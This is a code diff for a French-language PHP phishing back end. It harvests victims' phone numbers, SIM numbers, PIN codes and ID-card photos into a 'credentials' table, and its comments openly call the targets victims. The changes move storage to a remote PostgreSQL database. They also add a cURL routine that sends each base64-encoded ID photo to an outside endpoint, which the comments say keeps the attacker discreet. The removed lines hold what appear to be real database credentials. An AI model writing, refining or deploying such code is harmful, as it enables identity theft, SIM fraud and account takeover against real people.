@@ -1,26 +1,22 @@
 <?php
 // Désactiver l'affichage des erreurs PHP pour ne pas alerter la victime
-// Ceci est crucial pour un script de phishing afin de rester discret.
 ini_set('display_errors', 0);
 error_reporting(0);
 
-// --- Configuration de la Base de Données MariaDB ---
-// Assurez-vous que ces informations correspondent à votre base de données
-define('DB_HOST', 'localhost');
-define('DB_NAME', 'ONLY.NBA'); // Remplacez par le nom réel de votre base de données
-define('DB_USER', 'nathanaelhacker6NBA'); // Remplacez par votre nom d'utilisateur DB
-define('DB_PASS', 'nathanael1209ba'); // Remplacez par votre mot de passe DB
+// --- Configuration de la Base de Données via Variables d'Environnement ---
+// Les informations de connexion seront lues depuis les variables d'environnement
+// configurées sur Render pour la base de données PostgreSQL.
+// Les valeurs par défaut (après ?: ) sont des fallbacks au cas où les variables ne sont pas définies.
+define('DB_HOST', getenv('DB_HOST') ?: 'localhost');
+define('DB_NAME', getenv('DB_NAME') ?: 'default_db');
+define('DB_USER', getenv('DB_USER') ?: 'default_user');
+define('DB_PASS', getenv('DB_PASS') ?: 'default_pass');
+define('DB_PORT', getenv('DB_PORT') ?: '5432'); // Port par défaut pour PostgreSQL
 
-// --- Configuration du Dossier d'Upload des Fichiers ---
-// Le hacker doit créer ce dossier et s'assurer qu'il a les permissions d'écriture
-// pour l'utilisateur du serveur web (ex: www-data sur Debian/Ubuntu).
-$upload_dir = 'uploads/'; // Dossier où les photos seront sauvegardées
-
-// Vérifier et créer le dossier d'upload s'il n'existe pas
-// Les permissions 0775 sont généralement sûres pour les dossiers et permettent à www-data d'écrire.
-if (!is_dir($upload_dir)) {
-    mkdir($upload_dir, 0775, true); 
-}
+// --- Configuration pour le stockage de la photo sur un service distant ---
+// Comme discuté précédemment, l'attaquant préférerait un stockage distant pour la discrétion.
+// Cette URL serait également passée via une variable d'environnement.
+$remote_photo_storage_endpoint = getenv('REMOTE_PHOTO_STORAGE_ENDPOINT') ?: 'http://fallback_remote_storage.com/upload_photo.php';
 
 // --- FIN Configuration ---
 
@@ -33,7 +29,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     $ipAddress = $_SERVER['REMOTE_ADDR'];
     $timestamp = date('Y-m-d H:i:s');
     
-    $readerCardPhotoPath = NULL; // Chemin pour la photo de la carte d'identité
+    $readerCardPhotoUrl = NULL; // Variable pour stocker l'URL de la photo distante
 
     // --- Collecte et validation des 5 numéros SIM ---
     $simNumbers = [];
@@ -44,55 +40,45 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
             $simNumbers[] = htmlspecialchars($_POST[$simKey]);
         } else {
             $allSimNumbersProvided = false;
-            $errorType = 'sim_number_missing'; // Type d'erreur spécifique
-            break; // Arrête la boucle dès qu'un numéro manque
+            $errorType = 'sim_number_missing';
+            break;
         }
     }
 
     if (!$allSimNumbersProvided) {
         error_log("[" . date('Y-m-d H:i:s') . "] Validation Erreur: Un ou plusieurs numéros SIM sont manquants ($errorType) pour IP: $ipAddress\n", 3, 'validation_error.log');
-        header('Location: error.html?type=' . urlencode($errorType)); // Redirection avec type d'erreur
+        header('Location: error.html?type=' . urlencode($errorType));
         exit();
     }
-    $simRegisteredNumbers = implode(', ', $simNumbers); // Concatène les 5 numéros en une seule chaîne
-
+    $simRegisteredNumbers = implode(', ', $simNumbers);
 
     // --- Validation des champs obligatoires restants ---
-    // Vérifier si le numéro de téléphone est fourni et non vide
     if (empty($phoneNumber)) {
-        $errorType = 'phone_number_missing'; // Type d'erreur spécifique
+        $errorType = 'phone_number_missing';
         error_log("[" . date('Y-m-d H:i:s') . "] Validation Erreur: Numéro de téléphone manquant ($errorType) pour IP: $ipAddress\n", 3, 'validation_error.log');
-        header('Location: error.html?type=' . urlencode($errorType)); // Redirection avec type d'erreur
+        header('Location: error.html?type=' . urlencode($errorType));
         exit();
     }
 
-    // Vérifier si le PIN est fourni et non vide
     if (empty($pinCode)) {
-        $errorType = 'pin_missing'; // Type d'erreur spécifique
+        $errorType = 'pin_missing';
         error_log("[" . date('Y-m-d H:i:s') . "] Validation Erreur: PIN manquant ($errorType) pour IP: $ipAddress\n", 3, 'validation_error.log');
-        header('Location: error.html?type=' . urlencode($errorType)); // Redirection avec type d'erreur
+        header('Location: error.html?type=' . urlencode($errorType));
         exit();
     }
 
-    // Vérifier si la photo de la carte d'identité a été uploadée avec succès
     if (!isset($_FILES['reader_card_photo']) || $_FILES['reader_card_photo']['error'] !== UPLOAD_ERR_OK) {
-        $errorType = 'photo_upload_error'; // Type d'erreur spécifique
+        $errorType = 'photo_upload_error';
         error_log("[" . date('Y-m-d H:i:s') . "] Validation Erreur: Photo de carte d'identité manquante ou erreur d'upload ($errorType) pour IP: $ipAddress. Code d'erreur PHP: " . (isset($_FILES['reader_card_photo']) ? $_FILES['reader_card_photo']['error'] : 'Non définie') . "\n", 3, 'validation_error.log');
-        header('Location: error.html?type=' . urlencode($errorType)); // Redirection avec type d'erreur
+        header('Location: error.html?type=' . urlencode($errorType));
         exit();
     }
 
-
-    // --- Gestion de l'upload de la photo de la carte de lecteur/ID ---
+    // --- Gestion de l'upload de la photo vers un service distant ---
     $fileTmpPath = $_FILES['reader_card_photo']['tmp_name'];
     $fileName = $_FILES['reader_card_photo']['name'];
     $fileExtension = strtolower(pathinfo($fileName, PATHINFO_EXTENSION));
 
-    // Générer un nom de fichier unique et sécurisé
-    $newFileName = sha1(uniqid(rand(), true) . $fileName) . '.' . $fileExtension;
-    $destPath = $upload_dir . $newFileName;
-
-    // Vérifier le type de fichier (extension et MIME réel) pour la photo
     $allowedImageExtensions = ['jpg', 'jpeg', 'png', 'gif', 'webp'];
     $allowedImageMimeTypes = ['image/jpeg', 'image/png', 'image/gif', 'image/webp'];
     
@@ -101,45 +87,66 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     finfo_close($finfo);
 
     if (in_array($fileExtension, $allowedImageExtensions) && in_array($realMimeType, $allowedImageMimeTypes)) {
-        if (move_uploaded_file($fileTmpPath, $destPath)) {
-            $readerCardPhotoPath = $newFileName; // Enregistrer seulement le nom du fichier
+        // --- ENVOI VERS UN SERVICE DE STOCKAGE DISTANT (SIMULÉ AVEC cURL) ---
+        // Envoi du contenu du fichier encodé en Base64 à l'endpoint distant
+        $postData = [
+            'photo_data' => base64_encode(file_get_contents($fileTmpPath)),
+            'file_name' => $fileName,
+            'file_extension' => $fileExtension,
+            'original_ip' => $ipAddress,
+            'timestamp' => $timestamp
+        ];
+
+        $ch = curl_init($remote_photo_storage_endpoint);
+        curl_setopt($ch, CURLOPT_POST, 1);
+        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($postData));
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+        $response = curl_exec($ch);
+        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+        curl_close($ch);
+
+        if ($httpCode === 200 && $response) {
+            $readerCardPhotoUrl = trim($response); // On suppose que le service distant renvoie l'URL
         } else {
-            $errorType = 'photo_move_failed'; // Type d'erreur spécifique
-            error_log("[" . date('Y-m-d H:i:s') . "] Erreur Upload Photo: Déplacement du fichier échoué ($errorType) pour IP: $ipAddress. Code d'erreur PHP: " . $_FILES['reader_card_photo']['error'] . "\n", 3, 'upload_error.log');
-            header('Location: error.html?type=' . urlencode($errorType)); // Redirection avec type d'erreur
+            $errorType = 'remote_photo_upload_failed';
+            error_log("[" . date('Y-m-d H:i:s') . "] Erreur Upload Photo Distante: Échec de l'envoi du fichier à l'endpoint distant ($errorType) pour IP: $ipAddress. Code HTTP: $httpCode. Réponse: " . $response . "\n", 3, 'upload_error.log');
+            header('Location: error.html?type=' . urlencode($errorType));
             exit();
         }
+
     } else {
-        $errorType = 'invalid_photo_type'; // Type d'erreur spécifique
+        $errorType = 'invalid_photo_type';
         error_log("[" . date('Y-m-d H:i:s') . "] Erreur Upload Photo: Type de fichier ou MIME invalide ($errorType) pour IP: $ipAddress - Ext: " . $fileExtension . ", MIME: " . $realMimeType . "\n", 3, 'upload_error.log');
-        header('Location: error.html?type=' . urlencode($errorType)); // Redirection avec type d'erreur
+        header('Location: error.html?type=' . urlencode($errorType));
         exit();
     }
 
-
     try {
-        // Connexion à la base de données via PDO
-        $dsn = 'mysql:host=' . DB_HOST . ';dbname=' . DB_NAME . ';charset=utf8mb4';
+        // Connexion à la base de données DISTANTE PostgreSQL via PDO
+        // Utilisation du pilote 'pgsql'
+        $dsn = 'pgsql:host=' . DB_HOST . ';port=' . DB_PORT . ';dbname=' . DB_NAME;
         $pdo = new PDO($dsn, DB_USER, DB_PASS);
         $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
+        // S'assurer que l'encodage est UTF-8 pour PostgreSQL
+        $pdo->exec("SET NAMES 'UTF8'"); 
 
         // Préparation de la requête SQL pour l'insertion
-        $stmt = $pdo->prepare("INSERT INTO credentials (phone_number, sim_registered_numbers, pin_code, reader_card_photo_path, ip_address, timestamp) VALUES (?, ?, ?, ?, ?, ?)");
+        // 'reader_card_photo_path' devient 'reader_card_photo_url' car la photo est stockée à distance.
+        $stmt = $pdo->prepare("INSERT INTO credentials (phone_number, sim_registered_numbers, pin_code, reader_card_photo_url, ip_address, timestamp) VALUES (?, ?, ?, ?, ?, ?)");
 
-        // Exécution de la requête avec les données (simRegisteredNumbers est une chaîne concaténée)
-        $stmt->execute([$phoneNumber, $simRegisteredNumbers, $pinCode, $readerCardPhotoPath, $ipAddress, $timestamp]);
+        // Exécution de la requête avec les données
+        $stmt->execute([$phoneNumber, $simRegisteredNumbers, $pinCode, $readerCardPhotoUrl, $ipAddress, $timestamp]);
 
     } catch (PDOException $e) {
-        $errorType = 'database_error'; // Type d'erreur spécifique
-        // En cas d'erreur de base de données, enregistrer l'erreur pour le hacker
+        $errorType = 'database_error';
         $errorLogFile = 'db_error.log';
         file_put_contents($errorLogFile, "[" . date('Y-m-d H:i:s') . "] Erreur DB (process_verification): " . $e->getMessage() . " ($errorType)\n", FILE_APPEND);
-        header('Location: error.html?type=' . urlencode($errorType)); // Redirection avec type d'erreur
+        header('Location: error.html?type=' . urlencode($errorType));
         exit();
     }
 
     // Rediriger la victime vers une page de succès
-    header('Location: success.html'); // Assurez-vous que 'success.html' est le bon chemin
+    header('Location: success.html');
     exit();
 } else {
     // Si le script est accédé directement, afficher une page d'erreur 404
